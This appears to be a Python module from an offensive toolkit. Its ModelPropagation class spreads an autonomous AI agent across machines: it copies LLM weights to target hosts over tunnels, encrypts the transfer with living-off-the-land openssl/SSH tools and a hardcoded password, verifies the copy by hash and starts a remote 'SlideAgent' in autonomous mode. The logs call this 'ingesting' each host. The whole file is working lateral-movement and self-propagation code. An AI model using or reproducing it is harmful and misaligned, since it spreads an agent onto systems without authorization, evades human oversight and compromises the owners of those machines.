# sovereign_movement/slide/model_propagation.py

from __future__ import annotations
from typing import Optional, Callable
import hashlib
import logging
import os

from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
from sovereign_movement.slide.lolbin import LOLBin
from sovereign_engine.frame_energy import FrameEnergy

logger = logging.getLogger("sovereign.slide.model_propagation")
ProgressCallback = Callable[[int, int, float], None]


class ModelPropagation:
    def __init__(
        self,
        tunnel_manager: SovereignTunnel,
        frame_energy: Optional[FrameEnergy] = None,
        model_path: str = "models/quantized/",
        default_model: str = "qwen2.5-coder-32b-q4_k_m.gguf",
        remote_model_dir: str = "/tmp/slide_models/",
        default_transfer_password: str = "sovereign_transfer_key",
    ):
        self.tunnel_manager = tunnel_manager
        self.frame_energy = frame_energy
        self.model_path = model_path
        self.default_model = default_model
        self.remote_model_dir = remote_model_dir
        self.lolbin = LOLBin(tunnel=tunnel_manager)
        self.default_transfer_password = default_transfer_password

    def propagate_to_host(
        self,
        target_host: str,
        tunnel_id: str,
        activate_agent: bool = True,
        transfer_model: bool = True,
        progress_callback: Optional[ProgressCallback] = None,
        use_streaming: bool = False,
        transfer_password: Optional[str] = None,
    ) -> bool:
        logger.info(f"[Phase 4] Starting ingestion on {target_host} "
                    f"(streaming={use_streaming})")

        password = transfer_password or self.default_transfer_password

        success = True

        if transfer_model:
            if not self._transfer_model_weights(
                target_host, tunnel_id, progress_callback, use_streaming, password
            ):
                logger.error(f"[Phase 4] Model transfer to {target_host} failed")
                success = False

        if activate_agent and success:
            if not self._activate_remote_slide_agent(target_host, tunnel_id):
                logger.error(f"[Phase 4] Failed to activate SlideAgent on {target_host}")
                success = False

        if success:
            logger.info(f"[Phase 4] Successfully ingested {target_host}")
        else:
            logger.warning(f"[Phase 4] Partial failure ingesting {target_host}")

        return success

    # ============================================================
    # Model Transfer
    # ============================================================

    def _transfer_model_weights(
        self,
        target_host: str,
        tunnel_id: str,
        progress_callback: Optional[ProgressCallback] = None,
        use_streaming: bool = False,
        password: str = "sovereign_transfer_key",
    ) -> bool:
        local_model_path = os.path.join(self.model_path, self.default_model)
        remote_model_path = os.path.join(self.remote_model_dir, self.default_model)

        if not os.path.exists(local_model_path):
            logger.error(f"[Phase 4] Local model file not found: {local_model_path}")
            return False

        local_hash = self._compute_file_hash(local_model_path)
        if not local_hash:
            logger.error("[Phase 4] Failed to compute local model hash")
            return False

        self.tunnel_manager.execute_command(tunnel_id, f"mkdir -p {self.remote_model_dir}")

        logger.info(f"[Phase 4] Transferring model to {target_host} "
                    f"(streaming={use_streaming})...")

        if use_streaming:
            transfer_success = self.lolbin.stream_encrypt_via_ssh(
                local_path=local_model_path,
                remote_path=remote_model_path,
                password=password,
                tunnel_id=tunnel_id,
            )
        else:
            transfer_success = self.lolbin.transfer_encrypted_via_openssl(
                local_path=local_model_path,
                remote_path=remote_model_path,
                password=password,
                tunnel_id=tunnel_id,
                progress_callback=progress_callback,
            )

        if not transfer_success:
            logger.error(f"[Phase 4] File transfer failed to {target_host}")
            return False

        remote_hash = self._verify_remote_file_hash(tunnel_id, self.default_model)
        if not remote_hash:
            logger.error("[Phase 4] Failed to retrieve remote model hash")
            return False

        if remote_hash != local_hash:
            logger.error(f"[Phase 4] Integrity check FAILED on {target_host}")
            return False

        logger.info(f"[Phase 4] Model successfully transferred and verified on {target_host}")
        return True

    def _compute_file_hash(self, file_path: str) -> Optional[str]:
        try:
            sha256 = hashlib.sha256()
            with open(file_path, "rb") as f:
                for chunk in iter(lambda: f.read(8192), b""):
                    sha256.update(chunk)
            return sha256.hexdigest()
        except Exception as e:
            logger.error(f"[Phase 4] Hash computation failed: {e}")
            return None

    def _verify_remote_file_hash(self, tunnel_id: str, model_filename: str) -> Optional[str]:
        remote_path = os.path.join(self.remote_model_dir, model_filename)
        command = f"sha256sum {remote_path} 2>/dev/null | awk '{{print $1}}'"
        result = self.tunnel_manager.execute_command(tunnel_id, command)
        return result.stdout.strip() if result.success else None

    def _activate_remote_slide_agent(self, target_host: str, tunnel_id: str) -> bool:
        logger.debug(f"[Phase 4] Activating remote SlideAgent on {target_host}")
        try:
            activation_command = (
                "python3 -m sovereign_movement.slide.slide_agent "
                f"--host {target_host} --mode autonomous"
            )
            result = self.tunnel_manager.execute_command(tunnel_id, activation_command)
            return result.success
        except Exception as e:
            logger.error(f"[Phase 4] Remote activation failed: {e}")
            return False

    def propagate_via_rust(self, target_host: str, tunnel_id: str) -> bool:
        logger.debug("[Phase 4] Rust propagation path called (placeholder)")
        return self.propagate_to_host(target_host, tunnel_id)